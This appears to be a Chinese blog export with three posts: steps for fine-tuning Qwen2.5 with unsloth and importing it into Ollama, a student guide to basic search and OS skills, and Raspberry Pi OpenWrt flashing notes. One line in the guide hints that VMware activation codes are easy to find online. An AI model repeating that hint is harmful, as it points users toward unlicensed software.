<div class="note warning"><h4 id="⚠️-注意事项"><a href="#⚠️-注意事项" class="headerlink" title="⚠️ 注意事项"></a>⚠️ 注意事项</h4><p>由于脚本执行时会从 HuggingFace 拉取大量的数据，在本地执行的时候最好先添加下面的代码，修改环境变量来指定 HuggingFace 的镜像源用于加速下载</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.environ[<span class="string">&quot;HF_ENDPOINT&quot;</span>] = <span class="string">&quot;https://hf-mirror.com&quot;</span></span><br></pre></td></tr></table></figure>
</div>



<p>接下来以 Qwen2.5-7B-Instruct 为例简单记录一下微调过程：</p>
<ol>
<li><p>unsloth 的环境配置直接参考其 Github 仓库中的安装步骤即可</p>
</li>
<li><p>在 README 文档中找到 <a href="https://colab.research.google.com/drive/1qN1CEalC70EO1wGKhNxs1go1W9So61R5?usp=sharing">Qwen 2.5 conversational style notebook</a>，即 <code>Qwen 2.5 Conversational + Unsloth 2x faster finetuning.ipynb</code>，直接下载到本地</p>
</li>
<li><p>根据实际情况修改开头部分的模型选择：</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model, tokenizer = FastLanguageModel.from_pretrained(</span><br><span class="line">    <span class="comment"># Can select any from the below:</span></span><br><span class="line">    <span class="comment"># &quot;unsloth/Qwen2.5-0.5B&quot;, &quot;unsloth/Qwen2.5-1.5B&quot;, &quot;unsloth/Qwen2.5-3B&quot;</span></span><br><span class="line">    <span class="comment"># &quot;unsloth/Qwen2.5-14B&quot;,  &quot;unsloth/Qwen2.5-32B&quot;,  &quot;unsloth/Qwen2.5-72B&quot;,</span></span><br><span class="line">    <span class="comment"># And also all Instruct versions and Math. Coding verisons!</span></span><br><span class="line">    model_name = <span class="string">&quot;unsloth/Qwen2.5-7B-Instruct&quot;</span>,  <span class="comment"># 👈 改这里</span></span><br><span class="line">    max_seq_length = max_seq_length,</span><br><span class="line">    dtype = dtype,</span><br><span class="line">    load_in_4bit = load_in_4bit,</span><br><span class="line">    <span class="comment"># token = &quot;hf_...&quot;, # use one if using gated models like meta-llama/Llama-2-7b-hf</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>绝大部分内容保持默认即可，如果需要使用自己构建的训练数据集，需要改动 <code>load_dataset()</code> 的内容：</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> unsloth.chat_templates <span class="keyword">import</span> get_chat_template</span><br><span class="line"></span><br><span class="line">tokenizer = get_chat_template(</span><br><span class="line">    tokenizer,</span><br><span class="line">    chat_template = <span class="string">&quot;qwen-2.5&quot;</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">formatting_prompts_func</span>(<span class="params">examples</span>):</span><br><span class="line">    convos = examples[<span class="string">&quot;conversations&quot;</span>]</span><br><span class="line">    texts = [tokenizer.apply_chat_template(convo, tokenize = <span class="literal">False</span>, add_generation_prompt = <span class="literal">False</span>) <span class="keyword">for</span> convo <span class="keyword">in</span> convos]</span><br><span class="line">    <span class="keyword">return</span> &#123; <span class="string">&quot;text&quot;</span> : texts, &#125;</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> datasets <span class="keyword">import</span> load_dataset</span><br><span class="line">dataset = load_dataset(<span class="string">&quot;mlabonne/FineTome-100k&quot;</span>, split = <span class="string">&quot;train&quot;</span>)</span><br></pre></td></tr></table></figure>

<div class="note info"><h4 id="📒-一点建议"><a href="#📒-一点建议" class="headerlink" title="📒 一点建议"></a>📒 一点建议</h4><ul>
<li>自行构建微调数据集时可以先在 huggingface 中找到原本加载的数据集，参考其内容格式进行构建</li>
<li>具体的代码含义直接 AI 解释即可</li>
</ul>
</div>

<ol start="5">
<li>参数设置，这一步可以根据实际需求修改训练参数（重点修改 <code>num_train_epochs</code> 或 <code>max_steps</code>，如果希望模型在完整的数据集上训练固定的次数，可以使用 <code>num_train_epochs</code>，如果更关注训练的步数（例如，调试或小规模实验），可以使用 <code>max_steps</code>）</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> trl <span class="keyword">import</span> SFTTrainer</span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> TrainingArguments, DataCollatorForSeq2Seq</span><br><span class="line"><span class="keyword">from</span> unsloth <span class="keyword">import</span> is_bfloat16_supported</span><br><span class="line"></span><br><span class="line">trainer = SFTTrainer(</span><br><span class="line">    model = model,</span><br><span class="line">    tokenizer = tokenizer,</span><br><span class="line">    train_dataset = dataset,</span><br><span class="line">    dataset_text_field = <span class="string">&quot;text&quot;</span>,</span><br><span class="line">    max_seq_length = max_seq_length,</span><br><span class="line">    data_collator = DataCollatorForSeq2Seq(tokenizer = tokenizer),</span><br><span class="line">    dataset_num_proc = <span class="number">2</span>,</span><br><span class="line">    packing = <span class="literal">False</span>, <span class="comment"># Can make training 5x faster for short sequences.</span></span><br><span class="line">    args = TrainingArguments(</span><br><span class="line">        per_device_train_batch_size = <span class="number">2</span>,</span><br><span class="line">        gradient_accumulation_steps = <span class="number">4</span>,</span><br><span class="line">        warmup_steps = <span class="number">5</span>,</span><br><span class="line">        num_train_epochs = <span class="number">1</span>, <span class="comment"># Set this for 1 full training run.</span></span><br><span class="line">        <span class="comment"># max_steps = 60,</span></span><br><span class="line">        learning_rate = <span class="number">2e-4</span>,</span><br><span class="line">        fp16 = <span class="keyword">not</span> is_bfloat16_supported(),</span><br><span class="line">        bf16 = is_bfloat16_supported(),</span><br><span class="line">        logging_steps = <span class="number">1</span>,</span><br><span class="line">        optim = <span class="string">&quot;adamw_8bit&quot;</span>,</span><br><span class="line">        weight_decay = <span class="number">0.01</span>,</span><br><span class="line">        lr_scheduler_type = <span class="string">&quot;linear&quot;</span>,</span><br><span class="line">        seed = <span class="number">3407</span>,</span><br><span class="line">        output_dir = <span class="string">&quot;outputs&quot;</span>,</span><br><span class="line">        report_to = <span class="string">&quot;none&quot;</span>, <span class="comment"># Use this for WandB etc</span></span><br><span class="line">    ),</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>模型训练，<code>trainer.train()</code> 这一步执行后慢慢等待训练完成即可</li>
<li>完成训练后的内容是测试微调后的模型，略过这一步</li>
<li>保存模型，这一步可以将微调后的模型进行保存（存储到 huggingface 或者本地，也可导出 GGUF，支持导入到 Ollama 中）<ul>
<li>直接根据实际需求找到对应的行将 <code>if False</code> 该为 <code>True</code> 即可</li>
<li>例如导出为 <code>Q8_0</code>：</li>
</ul>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Save to 8bit Q8_0 (第一个参数是要导出的存放路径，可以自行指定)</span></span><br><span class="line"><span class="keyword">if</span> <span class="literal">True</span>: model.save_pretrained_gguf(<span class="string">&quot;path_to_save_model&quot;</span>, tokenizer,)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>至于不同的量化类型可以参考这两篇博客进行选择：<a href="https://zhaozhiming.github.io/2023/08/31/llm-quantization-format-introduce/">AI 模型量化格式介绍</a>, <a href="https://www.jamesflare.com/zh-cn/quantization-type-llama-cpp/">为 llama.cpp 选择理想的量化类型</a></p>
<ul>
<li>不过简单来说，如果配置足够，直接选用 <code>Q8_0</code> 就好</li>
</ul>
<p>顺带引用一下第二篇博客里的图片：</p>
<p><svg width="500" height="500" xmlns="http://www.w3.org/2000/svg" aria-roledescription="quadrantChart" role="graphics-document document" style="max-width: 500px;"> <style>#mermaid-1739162011740{font-family:”trebuchet ms”,verdana,arial,sans-serif;font-size:16px;fill:#333;}#mermaid-1739162011740 .error-icon{fill:#552222;}#mermaid-1739162011740 .error-text{fill:#552222;stroke:#552222;}#mermaid-1739162011740 .edge-thickness-normal{stroke-width:1px;}#mermaid-1739162011740 .edge-thickness-thick{stroke-width:3.5px;}#mermaid-1739162011740 .edge-pattern-solid{stroke-dasharray:0;}#mermaid-1739162011740 .edge-thickness-invisible{stroke-width:0;fill:none;}#mermaid-1739162011740 .edge-pattern-dashed{stroke-dasharray:3;}#mermaid-1739162011740 .edge-pattern-dotted{stroke-dasharray:2;}#mermaid-1739162011740 .marker{fill:#333333;stroke:#333333;}#mermaid-1739162011740 .marker.cross{stroke:#333333;}#mermaid-1739162011740 svg{font-family:”trebuchet ms”,verdana,arial,sans-serif;font-size:16px;}#mermaid-1739162011740 p{margin:0;}#mermaid-1739162011740 :root{–mermaid-font-family:”trebuchet ms”,verdana,arial,sans-serif;}</style> <g>  <title>background</title>  <rect fill="#ffffff" id="canvas_background" height="502" width="502" y="-1" x="-1"/> </g> <g>  <title>Layer 1</title>  <g id="svg_1"/>  <g id="svg_2" class="main">   <g id="svg_3" class="quadrants">    <g id="svg_4" class="quadrant">     <rect id="svg_5" fill="#ECECFF" height="212" width="232" y="45" x="263"/>     <text id="svg_6" text-anchor="middle" dominant-baseline="hanging" font-size="16" fill="#131300" y="50" x="379">最差模型</text>    </g>    <g id="svg_7" class="quadrant">     <rect id="svg_8" fill="#f1f1ff" height="212" width="232" y="45" x="31"/>     <text id="svg_9" text-anchor="middle" dominant-baseline="hanging" font-size="16" fill="#0e0e00" y="50" x="147">有潜力</text>    </g>    <g id="svg_10" class="quadrant">     <rect id="svg_11" fill="#f6f6ff" height="212" width="232" y="257" x="31"/>     <text id="svg_12" text-anchor="middle" dominant-baseline="hanging" font-size="16" fill="#090900" y="262" x="147">最佳模型</text>    </g>    <g id="svg_13" class="quadrant">     <rect id="svg_14" fill="#fbfbff" height="212" width="232" y="257" x="263"/>     <text id="svg_15" text-anchor="middle" dominant-baseline="hanging" font-size="16" fill="#040400" y="262" x="379">低优先级</text>    </g>   </g>   <g id="svg_16" class="border">    <line id="svg_17" stroke=" rgb(199, 199, 241)" style="stroke: rgb(199, 199, 241); stroke-width: 2;" y2="45" x2="496" y1="45" x1="30"/>    <line id="svg_18" stroke=" rgb(199, 199, 241)" style="stroke: rgb(199, 199, 241); stroke-width: 2;" y2="468" x2="495" y1="46" x1="495"/>    <line id="svg_19" stroke=" rgb(199, 199, 241)" style="stroke: rgb(199, 199, 241); stroke-width: 2;" y2="469" x2="496" y1="469" x1="30"/>    <line id="svg_20" stroke=" rgb(199, 199, 241)" style="stroke: rgb(199, 199, 241); stroke-width: 2;" y2="468" x2="31" y1="46" x1="31"/>    <line id="svg_21" stroke=" rgb(199, 199, 241)" style="stroke: rgb(199, 199, 241); stroke-width: 1;" y2="468" x2="263" y1="46" x1="263"/>    <line id="svg_22" stroke=" rgb(199, 199, 241)" style="stroke: rgb(199, 199, 241); stroke-width: 1;" y2="257" x2="494" y1="257" x1="32"/>   </g>   <g id="svg_23" class="data-points">    <g id="svg_24" class="data-point">     <circle id="svg_25" stroke-width="0px" stroke="hsl(240, 100%, NaN%)" fill="hsl(240, 100%, NaN%)" r="5" cy="447.8" cx="471.8"/>     <text id="svg_26" text-anchor="middle" dominant-baseline="hanging" font-size="12" fill="#131300" y="452.799988" x="471.799988">Q8_0</text>    </g>    <g id="svg_27" class="data-point">     <circle id="svg_28" stroke-width="0px" stroke="hsl(240, 100%, NaN%)" fill="hsl(240, 100%, NaN%)" r="5" cy="435.08" cx="355.8"/>     <text id="svg_29" text-anchor="middle" dominant-baseline="hanging" font-size="12" fill="#131300" y="440.079987" x="355.799988">Q6_K</text>    </g>    <g id="svg_30" class="data-point">     <circle id="svg_31" stroke-width="0px" stroke="hsl(240, 100%, NaN%)" fill="hsl(240, 100%, NaN%)" r="5" cy="384.2" cx="239.8"/>     <text id="svg_32" text-anchor="middle" dominant-baseline="hanging" font-size="12" fill="#131300" y="389.200012" x="239.800003">Q5_K_M</text>    </g>    <g id="svg_33" class="data-point">     <circle id="svg_34" stroke-width="0px" stroke="hsl(240, 100%, NaN%)" fill="hsl(240, 100%, NaN%)" r="5" cy="341.8" cx="263"/>     <text id="svg_35" text-anchor="middle" dominant-baseline="hanging" font-size="12" fill="#131300" y="346.799988" x="263">Q5_1</text>    </g>    <g id="svg_36" class="data-point">     <circle id="svg_37" stroke-width="0px" stroke="hsl(240, 100%, NaN%)" fill="hsl(240, 100%, NaN%)" r="5" cy="320.6" cx="216.6"/>     <text id="svg_38" text-anchor="middle" dominant-baseline="hanging" font-size="12" fill="#131300" y="325.600006" x="216.600006">Q5_K_S</text>    </g>    <g id="svg_39" class="data-point">     <circle id="svg_40" stroke-width="0px" stroke="hsl(240, 100%, NaN%)" fill="hsl(240, 100%, NaN%)" r="5" cy="278.2" cx="216.6"/>     <text id="svg_41" text-anchor="middle" dominant-baseline="hanging" font-size="12" fill="#131300" y="283.200012" x="216.600006">Q5_0</text>    </g>    <g id="svg_42" class="data-point">     <circle id="svg_43" stroke-width="0px" stroke="hsl(240, 100%, NaN%)" fill="hsl(240, 100%, NaN%)" r="5" cy="172.2" cx="170.2"/>     <text id="svg_44" text-anchor="middle" dominant-baseline="hanging" font-size="12" fill="#131300" y="177.199997" x="170.199997">Q4_1</text>    </g>    <g id="svg_45" class="data-point">     <circle id="svg_46" stroke-width="0px" stroke="hsl(240, 100%, NaN%)" fill="hsl(240, 100%, NaN%)" r="5" cy="299.4" cx="147"/>     <text id="svg_47" text-anchor="middle" dominant-baseline="hanging" font-size="12" fill="#131300" y="304.399994" x="147">Q4_K_M</text>    </g>    <g id="svg_48" class="data-point">     <circle id="svg_49" stroke-width="0px" stroke="hsl(240, 100%, NaN%)" fill="hsl(240, 100%, NaN%)" r="5" cy="235.8" cx="123.8"/>     <text id="svg_50" text-anchor="middle" dominant-baseline="hanging" font-size="12" fill="#131300" y="240.800003" x="123.800003">Q4_K_S</text>    </g>    <g id="svg_51" class="data-point">     <circle id="svg_52" stroke-width="0px" stroke="hsl(240, 100%, NaN%)" fill="hsl(240, 100%, NaN%)" r="5" cy="108.6" cx="100.6"/>     <text id="svg_53" text-anchor="middle" dominant-baseline="hanging" font-size="12" fill="#131300" y="113.599998" x="100.599998">Q4_0</text>    </g>    <g id="svg_54" class="data-point">     <circle id="svg_55" stroke-width="0px" stroke="hsl(240, 100%, NaN%)" fill="hsl(240, 100%, NaN%)" r="5" cy="129.8" cx="77.4"/>     <text id="svg_56" text-anchor="middle" dominant-baseline="hanging" font-size="12" fill="#131300" y="134.800003" x="77.400002">Q3_K_L</text>    </g>    <g id="svg_57" class="data-point">     <circle id="svg_58" stroke-width="0px" stroke="hsl(240, 100%, NaN%)" fill="hsl(240, 100%, NaN%)" r="5" cy="66.2" cx="54.2"/>     <text id="svg_59" text-anchor="middle" dominant-baseline="hanging" font-size="12" fill="#131300" y="71.199997" x="54.200001">Q3_K_M</text>    </g>   </g>   <g id="svg_60" class="labels">    <g id="svg_61" class="label">     <text id="svg_62" text-anchor="middle" dominant-baseline="hanging" font-size="16" fill="#131300" y="479" x="147">体积小</text>    </g>    <g id="svg_63" class="label">     <text id="svg_64" text-anchor="middle" dominant-baseline="hanging" font-size="16" fill="#131300" y="479" x="379">体积大</text>    </g>    <g id="svg_65" class="label">     <text id="svg_66" transform="rotate(-90 5.000000000000058,363.00000000000006) " text-anchor="middle" dominant-baseline="hanging" font-size="16" fill="#131300" y="363" x="5">困惑度小</text>    </g>    <g id="svg_67" class="label">     <text id="svg_68" transform="rotate(-90 5.000000000000029,151.00000000000003) " text-anchor="middle" dominant-baseline="hanging" font-size="16" fill="#131300" y="151" x="5">困惑度大</text>    </g>   </g>   <g id="svg_69" class="title">    <text id="svg_70" text-anchor="middle" dominant-baseline="hanging" font-size="20" fill="#131300" y="10" x="250">大小与困惑度变化对比</text>   </g>  </g> </g></svg></p>
</blockquote>
<ol start="9">
<li>导入到 Ollama 中运行微调后的模型，这一步直接使用上一步导出的模型文件中自带的 Modelfile 即可</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换到上一步导出的模型目录</span></span><br><span class="line">cd path_to_save_model</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导入</span></span><br><span class="line">ollama create &lt;model_name&gt; -f ./Modelfile</span><br></pre></td></tr></table></figure>

<h3 id="不使用框架"><a href="#不使用框架" class="headerlink" title="不使用框架"></a>不使用框架</h3><p>如果 unsloth 尚未支持需要微调的模型，可以在 <a href="https://github.com/datawhalechina/self-llm">开源大模型食用指南</a> 中尝试找一找微调指南</p>
]]></content>
      <tags>
        <tag>LLM</tag>
      </tags>
  </entry>
  <entry>
    <title>带你玩 💻</title>
    <url>/2023/12/03/os-basic/</url>
    <content><![CDATA[<h1 id="带你玩-💻"><a href="#带你玩-💻" class="headerlink" title="带你玩 💻"></a>带你玩 💻</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
<li>在助教工作过程中，总是遇到一些意想不到的基础问题，归根到底还是一些非常基础的东西没有接触过，水一篇文章来唠唠这个情况</li>
<li>就介绍一些比较基本的使用，作为计算机相关专业的学生，这些东西应该是每个人必备的能力</li>
<li>下面的内容对于纯小白来说可能还是有不知道的名词，建议自行搜索了解，或者直接问 ChatGPT </li>
<li>内容应该还是不全，有啥想到了再补充</li>
</ul>
<h2 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h2><ul>
<li>别用百度了，用 <a href="https://www.bing.com/">Bing</a> 吧<ul>
<li>如果能用 Google 更好</li>
<li>为啥呢？放俩图自己体会一下：<ul>
<li><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20231204160609160.png" alt="用百度搜" style="zoom: 50%;" /></li>
<li><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20231204160653135.png" alt="用必应搜" style="zoom: 50%;" /></li>
</ul>
</li>
<li>不管你坚持用的啥搜索引擎，还是建议给浏览器装个广告过滤插件<ul>
<li>比如 <code>uBlock Origin</code>, <code>Adblock Plus</code> 之类的</li>
</ul>
</li>
</ul>
</li>
<li>关键词搜索<ul>
<li>完整的句子适合去问 ChatGPT 而不是搜索引擎</li>
<li>专业问题尽量使用英文关键字</li>
</ul>
</li>
<li>稍微学一点搜索引擎的高级搜索语法<ul>
<li><code>site:</code> 指定要搜索的网站</li>
<li><code>filetype:</code> 指定要搜索的文件类型</li>
<li><code>&quot;&quot;</code> 双引号: 完全匹配搜索</li>
<li><code>-</code> 减号: 排除搜索</li>
<li>…</li>
</ul>
</li>
<li>要会区分官方网站、下载站、盗版站<ul>
<li>别下个软件跳到某某软件管家或者某某下载站下载</li>
<li>要想从官网下载的时候不要带 “下载” 关键字，试试直接搜索软件名</li>
</ul>
</li>
<li>学一下怎么区分高质量回答&#x2F;博客<ul>
<li>拥抱 <a href="https://stackoverflow.com/">stackoverflow</a></li>
<li>远离 CSDN、简书、知乎上仅仅几行代码、明显复制粘贴的内容</li>
</ul>
</li>
</ul>
<h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><ul>
<li>遇到报错不要慌，先看看报错信息说的啥，看不懂就拿翻译工具翻译一下<ul>
<li>定位相对关键的报错信息（例如某些情况下的最后一行有报错总结）拿去搜索</li>
</ul>
</li>
<li>学着看官方文档</li>
<li>如果是 Github 上开源的东西，试试从 Issues 里找解决方案</li>
<li>不要只会照搬现成的解决方案中的代码，要结合实际环境<ul>
<li>千万别看到一个解决方案的命令复制粘贴跑一下，不好使又再找一个再复制粘贴跑一下</li>
<li>不然环境怎么炸的都不知道</li>
</ul>
</li>
<li>关于问问题<ul>
<li>了解一下 《提问的智慧》</li>
<li>了解一下 《X-Y Problem》</li>
</ul>
</li>
</ul>
<h2 id="Windows-基本使用"><a href="#Windows-基本使用" class="headerlink" title="Windows 基本使用"></a>Windows 基本使用</h2><h3 id="常用软件"><a href="#常用软件" class="headerlink" title="常用软件"></a>常用软件</h3><p>(哪个用的惯用哪个)</p>
<ul>
<li><p>浏览器: <a href="https://www.google.cn/chrome/">Chrome</a>, <a href="https://www.microsoft.com/zh-cn/edge">Edge</a>, <a href="https://www.mozilla.org/zh-CN/firefox/new/">Firefox</a> 等</p>
<ul>
<li>学会通过安装浏览器插件来优化浏览器使用体验<ul>
<li>广告过滤</li>
<li>翻译插件</li>
<li>…</li>
</ul>
</li>
</ul>
</li>
<li><p>文本编辑器: <a href="https://code.visualstudio.com/">Visual Studio Code</a>, <a href="https://www.sublimetext.com/">Sublime Text</a>, <a href="https://gitee.com/cxasm/notepad--">ndd</a> 等</p>
<ul>
<li>顺带提一句，建议了解一下 Markdown</li>
</ul>
</li>
<li><p>解压缩软件: <a href="https://www.7-zip.org/">7-zip</a> 等</p>
<ul>
<li>别用 Windows 自带的解压缩（避免不必要的问题）</li>
</ul>
</li>
<li><p>虚拟机: <a href="https://www.vmware.com/cn/products/workstation-pro.html">VMware Workstation Pro</a>, <a href="https://www.virtualbox.org/">VirtualBox</a>, WSL2, Multipass 等</p>
<ul>
<li>VMware 激活码网上一搜一大把</li>
</ul>
</li>
<li><p>SSH 客户端: <a href="https://mobaxterm.mobatek.net/">MobaXterm</a>, <a href="https://github.com/kingToolbox/WindTerm">WindTerm</a>, <a href="https://www.hostbuf.com/">FinalShell</a> 等</p>
<ul>
<li>可能有人不知道什么是 SSH，可以先去搜一搜了解一下</li>
</ul>
</li>
<li><p>码代码: <a href="https://code.visualstudio.com/">Visual Studio Code</a></p>
</li>
<li><p>磁盘占用情况分析: <a href="https://www.diskanalyzer.com/">WizTree</a></p>
<ul>
<li>哎我C盘怎么红了？ 👉 拿这个工具去扫扫</li>
</ul>
</li>
<li><p>软件卸载工具: <a href="https://geekuninstaller.com/">geek</a></p>
</li>
<li><p>下载&#x2F;更新软件不要依赖某某软件管家，学会从官网下载</p>
</li>
</ul>
<details class="note warning"><summary><p>软件安装时注意:</p>
</summary>
<ul>
<li>⚠️ 注意所有软件的安装路径尽可能不要存在中文字符（为了避免某些软件出现稀奇古怪的问题）<ul>
<li>多提一句，当前用户的目录名也不要存在中文字符<ul>
<li>去 <code>C:\Users</code> 确认用户名是啥</li>
</ul>
</li>
</ul>
</li>
<li>⚠️ 不要把软件全部装在同一个目录下<ul>
<li>比如说在安装过程中不管什么软件都指定了 <code>D:\software</code> 作为安装路径 (这里没有带子目录)</li>
<li>否则卸载某一个软件的时候小心全给你扬了，或者出现其他稀奇古怪问题</li>
</ul>
</li>
</ul>

</details>

<h3 id="乱七八糟的内容"><a href="#乱七八糟的内容" class="headerlink" title="乱七八糟的内容"></a>乱七八糟的内容</h3><ul>
<li><p>建议开启显示已知文件后缀名</p>
<ul>
<li><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20231204174851175.png" alt="image-20231204174851175"></li>
<li>不要再出现说找不着文件的情况了 😅</li>
</ul>
</li>
<li><p>怎么看电脑 IP 地址（IPv4）？</p>
<ul>
<li>打开 <code>powershell</code>，输入 <code>ipconfig</code>，找到你的网卡对应的 IPv4 地址<ul>
<li>一般情况下是 <code>以太网适配器 以太网</code> 或者 <code>无线局域网适配器 WLAN</code></li>
</ul>
</li>
</ul>
</li>
<li><p>怎么启动 powershell？</p>
<ul>
<li>按下 <code>Win + R</code>，输入 <code>powershell</code>，回车</li>
</ul>
</li>
<li><p>不要无脑关掉系统防火墙、UAC 以及 Windows Defender</p>
<ul>
<li>如果你不使用破解软件，那无需安装任何第三方杀毒软件</li>
</ul>
</li>
</ul>
<h2 id="Linux-基本使用"><a href="#Linux-基本使用" class="headerlink" title="Linux 基本使用"></a>Linux 基本使用</h2><ul>
<li>以 Ubuntu 为例，安装就不说了</li>
<li>如果你使用的是带桌面环境的 Desktop 版本(是虚拟机且用的是VMware)，记着装 <code>open-vm-tools</code> 和 <code>open-vm-tools-desktop</code>: <code>sudo apt install open-vm-tools open-vm-tools-desktop -y</code><ul>
<li>这样你就可以在虚拟机和宿主机之间拖拽文件了</li>
</ul>
</li>
<li>如果你使用的是 Server 版本，或者你的使用场景不需要图形化界面（比如说你只需要打开终端执行命令就能完成你的工作），那建议走 ssh 连接的方式<ul>
<li>安装 ssh: 终端下执行 <code>sudo apt install ssh -y</code></li>
<li>查看本机 IP 地址: <code>ip addr</code> 或者 <code>ifconfig</code><ul>
<li>没有 <code>ifconfig</code> 命令的话，执行 <code>sudo apt install net-tools -y</code> 安装</li>
</ul>
</li>
<li>在客户端使用 ssh 连接<ul>
<li>关于 SSH，建议再去了解一下免密登录</li>
</ul>
</li>
<li>如果你想连接目标主机码代码，那建议使用 VSCode 的 Remote SSH 插件</li>
</ul>
</li>
<li>虚拟机的话了解一下共享文件夹的使用<ul>
<li>虚拟机内部会在 <code>/mnt/hgfs/</code> 挂载跟宿主机共享的文件夹</li>
</ul>
</li>
</ul>
<h2 id="macOS-基本使用"><a href="#macOS-基本使用" class="headerlink" title="macOS 基本使用"></a>macOS 基本使用</h2><ul>
<li>首先，不建议做系统安全的在初学阶段选择购买 M 系列的 macbook，不然会因为架构问题很多东西干不了</li>
<li>Windows、Linux 都会用的话，macOS 也没啥好说的</li>
</ul>
]]></content>
      <tags>
        <tag>Tutorial</tag>
        <tag>Linux</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派4B 折腾记 - Openwrt</title>
    <url>/2023/11/04/raspberrypi-openwrt/</url>
    <content><![CDATA[<h1 id="Raspberry-Pi-4B-–-OpenWRT"><a href="#Raspberry-Pi-4B-–-OpenWRT" class="headerlink" title="Raspberry Pi 4B – OpenWRT"></a>Raspberry Pi 4B – OpenWRT</h1><p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20231105154331378.png" alt="image-20231105154331378"></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
<p>使用的设备：Raspberry Pi 4B (2GB RAM)</p>
</blockquote>
<blockquote>
<p>【2023-11-06】的折腾内容:</p>
<ul>
<li><p>刷回官方系统（现在官方系统有刷机工具了，<a href="https://www.raspberrypi.com/software/">Raspberry Pi Imager</a> 选一选无脑刷就行）</p>
</li>
<li><p>一行命令装 <a href="https://docs.raspap.com/">RaspAP</a>:</p>
<ul>
<li>装了这个会把防火墙扬了，再开防火墙 RaspAP 会寄（也得研究防火墙配置了，对一堆需求的本懒人不友好）</li>
</ul>
</li>
<li><p>根据自身的需求分析一顿还是选择了直接刷 OpenWrt，需要的功能软件啥的 OpenWrt 都有软件包能干</p>
</li>
<li><p>本人需求：</p>
<ul>
<li>组建一个个人局域网（有线+无线）（主机+移动设备）：树莓派自带的就一个网口，要做 WAN 口用，自带无线网卡做 AP；再买一个 USB RJ45 转接口做 LAN 口</li>
<li>挂载一个硬盘用来做 nas 当备份盘：<code>luci-app-samba4</code></li>
<li>自动接入网络，并能够根据网络通断状况调用脚本自动认证登录：<code>luci-app-watchcat</code></li>
<li>能网络唤醒主机并远程连接：<code>luci-app-wolplus</code> + NAT 端口转发</li>
<li>接入私人局域网，在外访问管理页面：<code>luci-app-zerotier</code></li>
</ul>
</li>
<li><p>刷系统，找工具，安装，配置，折腾一顿突然 DHCP 跟 DNS 寄了（原因未知）</p>
<ul>
<li>研究半天还是解决不了 (👴🏻属实搞不明白服务都开着就是不给 DHCP 响应</li>
</ul>
</li>
<li><p>于是决定重刷解决一切稀奇古怪问题</p>
</li>
</ul>
</blockquote>
<blockquote>
<p>【2025-05-28更新】：由于原来的 OpenWRT 固件出现了稀奇古怪的问题，所以再次准备重新刷固件：</p>
<ol>
<li>每次开机热点无法自动启动，需要手动重启网卡才能正常</li>
<li>树莓派本身 DNS 解析异常，能 ping 通外网IP，无法解析域名（但连接热点的设备网络正常）</li>
<li>docker 容器无法访问外网（外部网关无法ping通），重置网络、重启无效</li>
</ol>
</blockquote>
<h2 id="固件"><a href="#固件" class="headerlink" title="固件"></a>固件</h2><ul>
<li>看文档先: <a href="https://openwrt.org/zh/docs/guide-quick-start/begin_here">OpenWrt 快速安装指南</a></li>
<li>网上冲浪寻找固件： <ul>
<li><del><a href="https://doc.openwrt.cc/2-OpenWrt-Rpi/1-Download/">https://doc.openwrt.cc/2-OpenWrt-Rpi/1-Download/</a></del> 【2025-05-28访问是空白页】</li>
<li><del><a href="https://openwrt.cc/releases/targets/bcm27xx/bcm2711/">https://openwrt.cc/releases/targets/bcm27xx/bcm2711/</a></del></li>
</ul>
</li>
<li>从恩山论坛上找了一些固件： <ul>
<li><a href="https://www.right.com.cn/forum/forum.php?mod=viewthread&tid=8248163">[2023-05-28] 树莓派全系列 Raspberry Pi B&#x2F;2B&#x2F;3B&#x2F;4B 在线定制OpenWrt固件 云插件 OTA</a><ul>
<li><a href="https://openwrt.ai/?target=bcm27xx/bcm2711&id=rpi-4">下载或定制适用于您设备的OpenWrt固件</a></li>
</ul>
</li>
<li><a href="https://www.right.com.cn/forum/forum.php?mod=viewthread&tid=8379758">【2025-5-5】每日更新 高大全 树莓派 Raspberry Pi 5&#x2F;4B&#x2F;400&#x2F;4CM Openwrt IPV6 固件</a><ul>
<li>plus 版本东西太多，刷了几次我这树莓派开机几分钟热点也启动不了，遗憾换掉</li>
<li>mini 版本东西太少，很多模块没编译安装，继续换</li>
</ul>
</li>
<li>以及在 Github 找到的固件：<ul>
<li><a href="https://github.com/bigbugcc/OpenWrts">Action Openwrt 云自动编译</a><ul>
<li>这个看起来基本也满足需求，但是配置完还是寄（又找不到热点）</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>在经历了找固件 -&gt; 刷固件 -&gt; 改配置 -&gt; 寄 -&gt; 找固件 的几轮循环后，👴🏻终究还是选择了自己编译😓</p>
<p>Github 仓库：<a href="https://github.com/coolsnowwolf/lede">https://github.com/coolsnowwolf/lede</a></p>
